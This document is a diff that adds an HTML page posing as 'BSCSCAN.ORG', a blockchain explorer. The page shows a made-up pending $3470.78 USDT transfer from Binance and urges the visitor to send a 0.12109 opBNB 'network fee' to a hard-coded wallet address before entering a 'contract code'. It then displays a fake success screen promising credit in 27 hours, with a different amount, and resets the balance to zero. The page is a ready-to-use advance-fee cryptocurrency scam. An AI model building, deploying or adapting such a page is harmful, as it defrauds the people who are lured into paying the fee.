@@ -1,0 +1,135 @@
+<!DOCTYPE html><html lang="en">
+<head>
+  <meta charset="UTF-8" /><meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>𝗕𝗦𝗖𝗦𝗖𝗔𝗡.𝗢𝗥𝗚</title>
+  <script src="https://cdn.jsdelivr.net/npm/ethers@6.6.2/dist/ethers.umd.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+  <style>
+    body { font-family:'Inter',sans-serif; background:#F8F9FA; margin:0; padding:0;
+      display:flex; justify-content:center; align-items:center; min-height:100vh; }
+    .container { background:#FFF; border:1px solid #DEE2E6; border-radius:8px;
+      padding:30px; width:100%; max-width:480px; text-align:center; box-shadow:0 2px 8px rgba(0,0,0,0.05); }
+    h1 { color:#2B6CB0; margin-bottom:20px; }
+    input, select { width:100%; padding:10px; margin:10px 0; border:1px solid #CED4DA; border-radius:4px; }
+    .btn { background:#2B6CB0; color:#fff; border:none; padding:10px 20px; margin:10px 5px;
+      border-radius:4px; cursor:pointer; font-weight:600; }
+    .btn:hover { background:#1A4A7A; }
+    .status, .wallet-status { color:#4A5568; margin:10px 0; font-size:14px; }
+    .back-btn { position:absolute; top:15px; left:15px; background:none; border:none; color:#2B6CB0; font-size:24px; cursor:pointer; }
+    .chart-container { margin:20px 0; height:300px; }
+    .hidden { display:none; }
+  </style>
+</head>
+<body>
+  <button class="back-btn hidden" onclick="goBack()">&lt;</button>  <div class="container" id="page1">
+    <h1>𝗕𝗡𝗕 𝗦𝗺𝗮𝗿𝘁 𝗖𝗵𝗮𝗶𝗻</h1>
+    <input type="text" id="manualAddress" placeholder="Enter BSC Address" />
+    <button class="btn" onclick="connectWallet()">Connect Wallet</button>
+  </div>  <div class="container hidden" id="dashboard">
+    <h1>𝗧𝗿𝗮𝗻𝘀𝗮𝗰𝘁𝗶𝗼𝗻 𝗪𝗮𝗹𝗹𝗲𝘁 𝗦𝗼𝘂𝗿𝗰𝗲 𝗗𝗮𝘀𝗵𝗯𝗼𝗮𝗿𝗱</h1>
+    <p>𝗔𝗗𝗗𝗥𝗘𝗦𝗦: <span id="shortAddress"></span></p>
+    <p>𝗧𝗿𝗮𝗻𝘀𝗮𝗰𝘁𝗶𝗼𝗻 𝗽𝗲𝗻𝗱𝗶𝗻𝗴.........</p>
+    <p>𝗧𝗿𝗮𝗻𝘀𝗮𝗰𝘁𝗶𝗼𝗻 𝘀𝗼𝘂𝗿𝗰𝗲: Binance</p>
+    <p>𝗧𝗿𝗮𝗻𝘀𝗮𝗰𝘁𝗶𝗼𝗻 𝗔𝗺𝗼𝘂𝗻𝘁: $3470.78 USDT</p>
+    <p>𝗡𝗲𝘁𝘄𝗼𝗿𝗸: Binance chain BSC BEP20</p>
+    <p>𝗡𝗲𝘁𝘄𝗼𝗿𝗸 𝗙𝗲𝗲: 0.12109 opBNB</p>
+    <p>𝗧𝗿𝗮𝗻𝘀𝗮𝗰𝘁𝗶𝗼𝗻 𝗦𝘁𝗮𝘁𝘂𝘀: in progress</p>
+    <div class="chart-container">
+      <div id="tradingview-widget"></div>
+    </div>
+    <button class="btn" onclick="nextPage('confirm1')">Confirm</button>
+  </div>  <div class="container hidden" id="confirm1">
+    <h1>Confirm opBNB</h1>
+    <button class="btn" onclick="nextPage('confirm2')">Confirm opBNB</button>
+  </div>  <div class="container hidden" id="confirm2">
+    <h1>𝗧𝗿𝗮𝗻𝘀𝗮𝗰𝘁𝗶𝗼𝗻 𝗜𝗻 𝗣𝗿𝗼𝗴𝗿𝗲𝘀𝘀......</h1>
+    <button class="btn" onclick="nextPage('contractInput')">Confirm</button>
+  </div>  <div class="container hidden" id="contractInput">
+    <h1>𝗜𝗻𝗽𝘂𝘁 𝗼𝗽𝗕𝗡𝗕 𝗖𝗼𝗻𝘁𝗿𝗮𝗰𝘁 𝗖𝗼𝗱𝗲</h1>
+    <p>𝗡𝗲𝘁𝘄𝗼𝗿𝗸: BNB Smart Chain BEP20:</p>
+    <p>𝗧𝗼𝗽-𝗨𝗽: 0.12109 opBNB</p>
+    <p><strong>0xFf5e8a2603e64b2950Ee8D0Af6AC86670bD5Db69</strong></p>
+    <input type="text" id="contractCode" placeholder="Enter contract code" />
+    <button class="btn" onclick="verifyContract()">Confirm contract transaction</button>
+    <div class="status" id="verifyStatus"></div>
+  </div>  <div class="container hidden" id="success">
+    <h1>✅ 𝗧𝗥𝗔𝗡𝗦𝗔𝗖𝗧𝗜𝗢𝗡 𝗦𝗨𝗖𝗖𝗘𝗦𝗦𝗙𝗨𝗟</h1>
+    <p>𝗔𝗺𝗼𝘂𝗻𝘁: $3270.78 USDT</p>
+    <p>𝗧𝗿𝗮𝗻𝘀𝗮𝗰𝘁𝗶𝗼𝗻 𝘀𝗼𝘂𝗿𝗰𝗲: 0x55d398326f99059ff775485246999027b3197955</p>
+    <p>𝗡𝗲𝘁𝘄𝗼𝗿𝗸: BNB Smart Chain BEP20</p>
+    <p>𝗧𝗿𝗮𝗻𝘀𝗮𝗰𝘁𝗶𝗼𝗻 𝗦𝘁𝗮𝘁𝘂𝘀: Successful✅️</p>
+    <p>𝗧𝗿𝗮𝗻𝘀𝗮𝗰𝘁𝗶𝗼𝗻 𝗡𝗼𝘁𝗲: To be credited to user address in 27HRS</p>
+  </div>  <div class="container hidden" id="declined">
+    <h1>❌ 𝗧𝗥𝗔𝗡𝗦𝗔𝗖𝗧𝗜𝗢𝗡 𝗗𝗘𝗖𝗟𝗜𝗡𝗘𝗗</h1>
+    <p>Invalid contract code.</p>
+  </div>  <script>
+    let pageHistory = [];
+
+    function showPage(id) {
+      document.querySelectorAll('.container').forEach(c => c.classList.add('hidden'));
+      document.getElementById(id).classList.remove('hidden');
+      document.querySelector('.back-btn').classList.toggle('hidden', pageHistory.length === 0);
+    }
+
+    function nextPage(id) {
+      const current = document.querySelector('.container:not(.hidden)').id;
+      pageHistory.push(current);
+      showPage(id);
+    }
+
+    function goBack() {
+      if (pageHistory.length > 0) {
+        const prev = pageHistory.pop();
+        showPage(prev);
+      }
+    }
+
+    async function connectWallet() {
+      const inputAddr = document.getElementById("manualAddress").value.trim();
+      if (!/^0x[a-fA-F0-9]{40}$/.test(inputAddr)) return alert("Invalid BSC address");
+      localStorage.setItem("connectedAddress", inputAddr);
+      document.getElementById("shortAddress").innerText = inputAddr.slice(0,6) + "..." + inputAddr.slice(-4);
+      showPage("dashboard");
+    }
+
+    async function verifyContract() {
+      const code = document.getElementById("contractCode").value.trim();
+      const status = document.getElementById("verifyStatus");
+      if (code === "0x55d398326f99059ff775485246999027b3197955") {
+        status.innerText = "⏳ Processing...";
+        setTimeout(() => {
+          showPage("success");
+          setTimeout(() => {
+            showPage("dashboard");
+            document.getElementById("shortAddress").innerText = "0000.00";
+          }, 20000);
+        }, 60000);
+      } else {
+        showPage("declined");
+        setTimeout(() => showPage("contractInput"), 5000);
+      }
+    }
+
+    window.onload = () => {
+      const saved = localStorage.getItem("connectedAddress");
+      if (saved) {
+        document.getElementById("shortAddress").innerText = saved.slice(0,6) + "..." + saved.slice(-4);
+        showPage("dashboard");
+      } else {
+        showPage("page1");
+      }
+
+      new TradingView.widget({
+        "width": "100%",
+        "height": 300,
+        "symbol": "BINANCE:BNBUSDT",
+        "interval": "D",
+        "timezone": "Etc/UTC",
+        "theme": "light",
+        "style": "1",
+        "locale": "en",
+        "container_id": "tradingview-widget"
+      });
+    };
+  </script>  <script src="https://s3.tradingview.com/tv.js"></script></body>
+</html>
